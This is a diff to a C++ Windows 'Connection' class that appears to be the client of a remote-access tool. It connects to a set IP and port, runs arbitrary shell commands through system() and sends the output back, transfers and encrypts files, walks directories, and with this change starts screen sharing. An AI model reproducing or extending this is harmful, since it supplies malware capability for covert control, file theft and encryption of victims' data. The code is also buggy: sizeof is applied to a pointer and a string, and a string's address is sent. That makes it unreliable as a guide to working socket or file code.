@@ -2,8 +2,8 @@
 // Created by avita on 07/08/2020.
 //
 
+#include "ShareScreen.h"
 #include "Connection.h"
-
 
 Connection::Connection(string ip, unsigned int port) {
     Connection::ip = ip;
@@ -12,14 +12,14 @@ Connection::Connection(string ip, unsigned int port) {
 
 }
 
-void Connection::sendMessage(const string message, SOCKET socket) {
-    send(socket, reinterpret_cast<const char*>(&message), sizeof(message), 0);
+void Connection::sendMessage(const char *data) {
+    send(sock, data, sizeof(data), 0);
     return;
 }
 
 
 void Connection::sendFile(string path) {
-    ifstream file{ path, ifstream::binary };
+    ifstream file{path, ifstream::binary};
     unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
 
     while (!file.eof()) {
@@ -48,7 +48,7 @@ void Connection::recvFile(string path) {
     return;
 }
 
-vector<filesystem::path>& Connection::getAllFiles(string path, vector<filesystem::path> files) {
+vector<filesystem::path> &Connection::getAllFiles(string path, vector<filesystem::path> files) {
 
 
     for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
@@ -58,7 +58,7 @@ vector<filesystem::path>& Connection::getAllFiles(string path, vector<filesystem
 }
 
 string Connection::readFile(filesystem::path path) {
-    ifstream file{ path.string(), ifstream::binary };
+    ifstream file{path.string(), ifstream::binary};
     unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
 
     while (!file.eof()) {
@@ -70,7 +70,7 @@ string Connection::readFile(filesystem::path path) {
 }
 
 void Connection::writeToFile(filesystem::path path, string data) {
-    ofstream file{ path.string(), ofstream::binary };
+    ofstream file{path.string(), ofstream::binary};
     file.write(data.c_str(), sizeof(data));
     file.flush();
     file.close();
@@ -104,7 +104,7 @@ void Connection::encryptFiles(string path) {
 
 void Connection::executeShell(string shell) {
     string output = to_string(system(shell.c_str()));
-    sendMessage(output, sock);
+    sendMessage(reinterpret_cast<const char *>(&output));
     return;
 }
 
@@ -130,7 +130,7 @@ void Connection::connection() {
     hint.sin_port = htons(port);
     inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
 
-    int connectionResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
+    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));
 
     if (connectionResult == INVALID_SOCKET) {
         cerr << "Cant connect to server" << WSAGetLastError << endl;
@@ -138,5 +138,10 @@ void Connection::connection() {
         WSACleanup();
         return;
     }
-    return;
+
+    ShareScreen *shareScreen = new ShareScreen(sock);
+    sendMessage("Test");
+    //The end of the program
+    closesocket(sock);
+    WSACleanup();
 }
